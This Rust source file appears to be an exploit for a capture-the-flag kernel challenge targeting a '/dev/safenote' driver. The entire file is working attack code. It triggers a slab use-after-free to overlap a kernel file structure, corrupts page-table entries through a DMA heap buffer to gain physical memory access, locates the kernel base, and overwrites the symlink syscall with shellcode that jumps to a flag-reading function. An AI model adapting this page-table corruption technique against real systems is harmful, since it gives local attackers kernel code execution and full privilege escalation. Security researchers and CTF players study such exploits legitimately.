#![feature(naked_functions)]
use core::arch::asm;
use core::num::NonZeroUsize;
use libc::{
    self, cpu_set_t, execve, getpid, ioctl, symlink, SYS_ioctl, SYS_kcmp, CPU_SET, CPU_ZERO,
    MAP_FAILED, MAP_FILE, O_RDONLY, O_RDWR, RLIMIT_NOFILE,
};
use nix::fcntl::{open, OFlag};
use nix::sys::mman::{mmap, mmap_anonymous, munmap};
use nix::sys::mman::{MapFlags, ProtFlags};
use nix::sys::resource::{getrlimit, setrlimit, Resource};
use nix::sys::stat::Mode;
use nix::unistd::dup;
use nix::unistd::{close, sleep};
use std::ffi::CString;
use std::fs::OpenOptions;
use std::io::Error;
use std::os::fd::FromRawFd;
use std::os::raw::c_void;
use std::os::unix::fs;
use std::os::unix::io::{AsRawFd, RawFd};
use std::process;
use std::ptr::{self, NonNull};
use std::sync::RwLock;

const DEV_PATH: &str = "/dev/safenote";
const ALLOC: i32 = 0x1337;
const FREE: i32 = 0x1338;
const BACKDOOR: i32 = 0x1339;

static PIPES: RwLock<[[i32; 0x2]; 0x1000]> = RwLock::new([[0i32; 2]; 0x1000]);
static FILES: RwLock<[i32; 0x1000]> = RwLock::new([0i32; 0x1000]);

const DMA_HEAP_IOCTL_ALLOC: u64 = 0xc0184800;

#[repr(C)]
struct IocArg {
    heap_idx: u32,
}

#[repr(C)]
struct DmaHeapAllocationData {
    len: u64,
    fd: u32,
    fd_flags: u32,
    heap_flags: u64,
}

fn wait() {
    info("Waiting...");
    unsafe {
        libc::getchar();
    }
}

fn alloc_pipe_buf(idx: usize) {
    unsafe {
        let mut pipes = PIPES.write().expect("Unable obtain write guard");
        let ret = libc::pipe(pipes[idx].as_mut_ptr());

        if ret < 0 {
            errExit("alloc fd");
        }
    }
}

fn release_pipe_buf(idx: usize) {
    if idx > PIPES.read().expect("Unable to obtain read guard").len() {
        errExit("free_pipe_buf: idx out of rang");
    }
    unsafe {
        let pipes = PIPES.read().expect("Unable to obtain read guard");
        let ret = libc::close(pipes[idx][0]);

        if ret < 0 {
            errExit("release pipe buf");
        }

        let ret = libc::close(pipes[idx][1]);

        if ret < 0 {
            errExit("release pipe buf");
        }
    }
}

fn alloc_file(idx: usize) {
    let mut files = FILES.write().expect("Unable to obtain write guard ");

    let fd = open("/", OFlag::O_RDONLY, Mode::empty()).expect(red("Failed to open file").as_str());

    files[idx] = fd;
}

fn close_file(idx: usize) {
    if idx > FILES.read().expect("Unable to obtain read guard").len() {
        errExit("close file: idx out of rang");
    }

    let files = FILES.read().expect("Unable to obtain read guard ");

    close(files[idx]).expect(red("Failed to close file").as_str());
}

fn errExit(msg: &str) {
    let red = "\x1b[31m";
    let reset = "\x1b[0m";
    println!("{}[-]{}: {:}{}", red, msg, Error::last_os_error(), reset);
    process::exit(1);
}

fn red(msg: &str) -> String {
    let red = "\x1b[31m";
    let reset = "\x1b[0m";
    format!("{}{}{}", red, msg, reset)
}

fn info(msg: &str) {
    let yellow = "\x1b[33m";
    let reset = "\x1b[0m";
    println!("{}[+]:{}{}", yellow, msg, reset);
}

fn print_hex(msg: &str, val: u64) {
    println!("{}{:#018x} ", msg, val);
}

// 256 entries
fn alloc(fd: RawFd, idx: u32) {
    let arg = IocArg { heap_idx: idx };
    unsafe {
        let res = libc::ioctl(fd, ALLOC, &arg);

        if res < 0 {
            errExit("alloc failed");
        }
    }
}

fn free(fd: RawFd, idx: u32) {
    let arg = IocArg { heap_idx: idx };
    unsafe {
        let res = libc::ioctl(fd, FREE, &arg);

        if res < 0 {
            errExit("free failed");
        }
    }
}

fn backdoor(fd: RawFd, idx: u32) {
    let arg = IocArg { heap_idx: idx };
    unsafe {
        let res = libc::ioctl(fd, BACKDOOR, &arg);

        if res < 0 {
            errExit("backdoor failed");
        }
    }
}

fn assign_to_core(core_id: usize) {
    unsafe {
        let mut mask: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut mask);
        CPU_SET(core_id, &mut mask);

        let res = libc::sched_setaffinity(getpid(), size_of::<cpu_set_t>(), &mask);

        if res < 0 {
            errExit("Assign to core failed");
        }
    }
}

fn increase_fd_limit() {
    let (soft, hard) = getrlimit(Resource::RLIMIT_NOFILE).expect(red("getrlimit fail").as_str());

    info(format!("Cur file descriptor limit: {}", soft).as_str());

    setrlimit(Resource::RLIMIT_NOFILE, hard, hard).expect(red("setrlimit fail").as_str());

    info(format!("New file descriptor limit: {}", hard).as_str());
}

fn is_same_file(fd1: i32, fd2: i32) -> bool {
    const KCMP_FILE: i32 = 0;
    unsafe {
        let ret = libc::syscall(SYS_kcmp, getpid(), getpid(), KCMP_FILE, fd1, fd2);

        if ret < 0 {
            errExit("kcmp");
        }

        ret == 0
    }
}

// Global variables for saving state
static mut USER_CS: u64 = 0;
static mut USER_SS: u64 = 0;
static mut USER_RSP: u64 = 0;
static mut USER_RFLAGS: u64 = 0;

fn save_state() {
    unsafe {
        asm!(
            "mov {0}, cs",
            "mov {1}, ss",
            "mov {2}, rsp",
            "pushfq",
            "pop {3}",
            out(reg) USER_CS,
            out(reg) USER_SS,
            out(reg) USER_RSP,
            out(reg) USER_RFLAGS,
            options(nostack, preserves_flags)
        );
    }
}

extern "C" fn win() {
    let ret = std::fs::read_to_string("/dev/vda").expect("Unable to read file");
    info(format!("Flag: {}", ret).as_str());
}

fn memmem(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

/*
void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] sched_setaffinity()");
    }
}

*/

/*
  kmem_cache: 0xffff9f3452f23100
    name: safenote
    flags: 0x4052000 (SLAB_ACCOUNT | SLAB_PANIC | SLAB_STORE_USER | SLAB_HWCACHE_ALIGN)
    object size: 0xc0 (chunk size: 0x100)
    offset (next pointer in chunk): 0x60
    random (xor key): 0xac179fc5f3656c8b ^ byteswap(&chunk->next)
    red_left_pad: 0x0
    kmem_cache_cpu (cpu0): 0xffffd641ffc09bc0
      active page: 0x0
    kmem_cache_cpu (cpu1): 0xffffd641ffd09bc0
      active page: 0x0
    next: 0xffff9f3444cfcf00


    static void set_cpu_partial(struct kmem_cache *s)
{
#ifdef CONFIG_SLUB_CPU_PARTIAL
    unsigned int nr_objects;

    /*
     * cpu_partial determined the maximum number of objects kept in the
     * per cpu partial lists of a processor.
     *
     * Per cpu partial lists mainly contain slabs that just have one
     * object freed. If they are used for allocation then they can be
     * filled up again with minimal effort. The slab will never hit the
     * per node partial lists and therefore no locking will be required.
     *
     * For backwards compatibility reasons, this is determined as number
     * of objects, even though we now limit maximum number of pages, see
     * slub_set_cpu_partial()
     */
    if (!kmem_cache_has_cpu_partial(s))
        nr_objects = 0;
    else if (s->size >= PAGE_SIZE)
        nr_objects = 6;
    else if (s->size >= 1024)
        nr_objects = 24;
    else if (s->size >= 256)
        nr_objects = 52;
    else
        nr_objects = 120;

    slub_set_cpu_partial(s, nr_objects);
#endif
*/

// slub-dump safenote -v
// cat /proc/slabinfo
// cat /sys/kernel/slab/safenote/slabs_cpu_partial

// cpu_partial_slabs = 7
// 16 objects per slab
fn main() {
    info("Exploit enter");
    assign_to_core(0);
    save_state();

    increase_fd_limit();
    let f = OpenOptions::new()
        .read(true)
        .write(true)
        .open(DEV_PATH)
        .expect("Failed to open dev");

    let fd = f.as_raw_fd();

    if fd < 0 {
        errExit("Failed to open safenote device");
    }

    let dma_f = OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/dma_heap/system")
        .expect("Failed to open dev");

    let dma_fd = dma_f.as_raw_fd();

    if dma_fd < 0x0 {
        errExit("Failed to open dma device");
    }

    let mut pages = Vec::new();

    let mask = 0xff000;
    let start = 0xdead0000 & !mask;
    info(format!("Start address: {:#018x}", start).as_str());
    for i in 0..0x200 {
        unsafe {
            // file struct is 256 bytes big => to maximize our chances we want pte
            // entries at every start of a file struct.
            // 256 / 8 = 0x20 => 0x1000*0x20 = 0x20000

            // mask the PTE index bits such that we start at index 0
            let ret = mmap_anonymous(
                NonZeroUsize::new(start + i * 0x20000),
                NonZeroUsize::new_unchecked(0x8000),
                ProtFlags::PROT_WRITE | ProtFlags::PROT_READ,
                MapFlags::MAP_ANONYMOUS | MapFlags::MAP_SHARED,
            )
            .expect(red("Mmap").as_str());

            pages.push(ret);
        }
    }

    for i in 1..0x80 {
        alloc(fd, i);
        if i == 0x40 {
            alloc(fd, 0);
        }
    }

    for i in 1..0x80 {
        free(fd, i);
        if i == 0x40 {
            backdoor(fd, 0);
        }
    }

    for i in 0..0x200 {
        alloc_file(i);
    }

    // UAF the file struct overlaying our note struct
    free(fd, 0);

    // allocate another file struct on top of this
    for i in 0x200..0x240 {
        alloc_file(i);
    }

    let fds = FILES.read().expect(red("Files read lock").as_str());
    let mut uaf_fd_idx = 0;
    let mut overlap_fd_idx = 0;

    for i in 0x200..0x240 {
        for j in 0x0..0x200 {
            if is_same_file(fds[i], fds[j]) {
                info("Found overlapping files");

                // fd from the first spray
                uaf_fd_idx = j;
                // fd we will use to corrupt pte
                overlap_fd_idx = i;
                break;
            }
        }
    }

    if uaf_fd_idx == overlap_fd_idx {
        errExit("Unable to find overlapping file structs");
    }

    //info(format!("UAF fd: {}, overlap_fd: {}", uaf_fd, overlap_fd).as_str());

    // free the note with which uaf_fd overlaps

    info("Freeing fds");

    for i in 0x0..0x240 {
        if i == uaf_fd_idx {
            continue;
        }

        close_file(i as usize);
    }

    info("Page spray");

    // Try to trigger an allocation of a PTE at the place where the overlapped file is
    for i in 0..0x100 {
        let page = pages[i].as_ptr() as *mut u8;
        for j in 0..0x8 {
            unsafe {
                let ptr = page.add(j * 0x1000);
                *ptr = b'A' + j as u8;
            }
        }
    }

    let dma_data = DmaHeapAllocationData {
        len: 0x1000,
        fd: 0,
        fd_flags: O_RDWR as u32,
        heap_flags: 0,
    };

    info("Allocating dma heap");

    unsafe {
        let ret = ioctl(dma_fd, DMA_HEAP_IOCTL_ALLOC as i32, &dma_data);

        if ret < 0 {
            errExit(red("Dma heap alloc").as_str());
        }
    }

    for i in 0x100..0x200 {
        let page = pages[i].as_ptr() as *mut u8;
        for j in 0..0x8 {
            unsafe {
                let ptr = page.add(j * 0x1000);
                *ptr = b'A' + j as u8;
            }
        }
    }

    // corrupt pte to have 2 entries point to the same physical page
    for _ in 0..0x1000 {
        dup(fds[uaf_fd_idx]).expect(red("dup").as_str());
    }

    info("Searching overlapping page");
    let mut evil = ptr::null();
    for i in 0..0x200 {
        let page = pages[i].as_ptr() as *mut u8;
        unsafe {
            let ptr = page.add(0x7000); // 0x38 = f_count
            if *ptr != b'A' + 0x7 {
                evil = ptr;
                break;
            }
        }
    }

    if evil == ptr::null() {
        errExit(red("Unable to find overlapping pages").as_str());
    }

    info(format!("Found overlapping page: {:#018x}", evil as u64).as_str());

    unsafe {
        munmap(NonNull::new(evil as *mut c_void).unwrap(), 0x1000).expect(red("unmap").as_str());
    }

    let dma_buf = unsafe {
        mmap(
            Some(NonZeroUsize::new_unchecked(evil as usize)),
            NonZeroUsize::new_unchecked(0x1000),
            ProtFlags::PROT_READ | ProtFlags::PROT_WRITE,
            MapFlags::MAP_SHARED | MapFlags::MAP_POPULATE,
            std::fs::File::from_raw_fd(dma_data.fd as i32),
            0,
        )
        .expect(red("mmap dma buf").as_str())
    };

    unsafe {
        let ptr = dma_buf.as_ptr() as *mut u8;
        *ptr = b'0';
    }

    // have the physical page of the dma_buf point to another pte
    for i in 0..0x1000 {
        dup(fds[uaf_fd_idx]).expect(red("dup").as_str());
    }

    // full control over a pte now, so corrupt entry
    let dma_ptr = dma_buf.as_ptr() as *mut u64;

    unsafe {
        *dma_ptr = 0x800000000009c067;
    }

    let mut phys_base = 0x0;
    let mut controlled_page_idx = 0x0;
    for i in 0..0x100 {
        if pages[i].as_ptr() as *const u8 == evil {
            continue;
        }
        let page = pages[i].as_ptr() as *const u64;
        unsafe {
            if *page > 0xffff {
                controlled_page_idx = i;
                unsafe {
                    let www_buf = *page;
                    info(format!("www_buf: {:#018x}", www_buf).as_str());
                    phys_base = www_buf - 0x3a04063;
                    break;
                }
            }
        }
    }

    if phys_base == 0x0 {
        errExit("Unable to find physical kernel base");
    }

    info(format!("Physical kernel base: {:#018x}", phys_base).as_str());

    let symlink_at_phys = phys_base + 0x42cc40;

    let mut sc = include_bytes!("../sc.bin").to_vec();

    let replacements = [
        (b"\x11\x11\x11\x11\x11\x11\x11\x11", unsafe { getpid() }
            as u64),
        (b"\x22\x22\x22\x22\x22\x22\x22\x22", win as *const () as u64),
        (b"\x33\x33\x33\x33\x33\x33\x33\x33", unsafe { USER_CS }),
        (b"\x44\x44\x44\x44\x44\x44\x44\x44", unsafe { USER_RFLAGS }),
        (b"\x55\x55\x55\x55\x55\x55\x55\x55", unsafe { USER_RSP }),
        (b"\x66\x66\x66\x66\x66\x66\x66\x66", unsafe { USER_SS }),
    ];

    for (placeholder, value) in replacements {
        if let Some(pos) = memmem(&sc, placeholder) {
            let bytes = value.to_le_bytes();
            sc[pos..pos + 8].copy_from_slice(&bytes);
        } else {
            errExit("Unable to find placeholder");
        }
    }

    unsafe {
        *dma_ptr = (symlink_at_phys & !0xfff) | 0x8000000000000067;
    }

    unsafe {
        let ptr = (pages[controlled_page_idx].as_ptr() as *mut u8)
            .add((symlink_at_phys & 0xfff) as usize);
        ptr::copy(sc.as_ptr(), ptr, sc.len());
    }

    info("Copied shellcode. Triggering");

    fs::symlink("/tmp", "/tmp/x");

    wait();
}
